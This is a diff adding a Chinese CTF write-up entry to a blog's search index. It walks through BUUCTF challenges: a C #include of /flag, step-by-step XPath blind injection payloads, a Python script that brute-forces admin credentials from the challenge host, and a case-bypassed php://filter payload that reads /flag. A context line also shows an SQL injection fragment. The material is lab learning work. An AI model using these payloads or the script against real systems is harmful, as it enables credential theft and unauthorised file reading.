@@ -4932,4 +4932,56 @@ select count(*),concat((select database()),floor(rand()*2))as a from information
         <tag>CTF</tag>
       </tags>
   </entry>
+  <entry>
+    <title>buu5</title>
+    <url>/2021/08/04/buu5/</url>
+    <content><![CDATA[<h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p>这是个c语言编译器，我们随便输入点什么，会出现报错。</p>
+<p>然后通过c语言预处理包含flag报错输出flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &quot;/flag&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><p>抓包看了一下是xml语分，学习了一下陌生的注入手法，<a href="https://xz.aliyun.com/t/7791#toc-6">XPATH注入</a></p>
+<p>首先盲注有几个根节点</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or count(/)=1 or &#x27;&#x27;=&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>回显非法操作</p>
+<p>再输出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or count(/)=2 or &#x27;&#x27;=&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>回显用户名密码错误，</p>
+<p>所以可以得到只有一个根节点，我们再盲注出该根节点的长度</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or string-length(name(/*[1]))=4 or &#x27;&#x27;=&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>得到是长度为4.</p>
+<p>还需要爆破具体名称</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or substring(name(/*[1]), 1, 1)=&#x27;a&#x27;  or &#x27;&#x27;=&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>然后爆破子节点，还有子节点的子节点…  直接上脚本了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line">s = requests.session()</span><br><span class="line">url =&#x27;http://e1d6f23f-0b1e-44bc-a0d1-c9850b9d2570.node4.buuoj.cn:81/index.php&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">head =&#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/xml&quot;</span><br><span class="line">&#125;</span><br><span class="line">find =re.compile(&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;)</span><br><span class="line"></span><br><span class="line">strs =&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag =&#x27;&#x27;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in strs:</span><br><span class="line"></span><br><span class="line">        r = s.post(url=url)</span><br><span class="line">        token = find.findall(r.text)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        #猜测根节点名称</span><br><span class="line">        payload_1 = &quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span><br><span class="line">        #猜测子节点名称</span><br><span class="line">        payload_2 = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span><br><span class="line"></span><br><span class="line">        #猜测accounts的节点</span><br><span class="line">        payload_3 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span><br><span class="line"></span><br><span class="line">        #猜测user节点</span><br><span class="line">        payload_4 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span><br><span class="line"></span><br><span class="line">        #跑用户名和密码</span><br><span class="line">        payload_username =&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span><br><span class="line"></span><br><span class="line">        payload_password =&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        print(payload_password)</span><br><span class="line">        r = s.post(url=url,headers=head,data=payload_password)</span><br><span class="line">        print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if &quot;非法操作&quot; in r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    if &quot;用户名或密码错误!&quot; in r.text:</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>存在两组用户名和密码，我们获取第二组的是管理员的。</p>
+<p>爆出用户名</p>
+<p>adm1n</p>
+<p>密码的md5值</p>
+<p>cf7414b5bdb2e65ee43083f4ddbc4d9f</p>
+<p>解码一下是gtfly123，其实就是第一组的用户名。</p>
+<p>成功登录后，有提示base64解码，有file可以传参，通过php伪协议读取文件，但是过滤了php、base64、read，我们通过大小写绕过php和base64，然后删除read，不加read也可以读取文件内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phP://filter/convert.bAse64-encode/resource=/flag</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="网鼎杯-2020-青龙组-filejava"><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h2>]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
 </search>
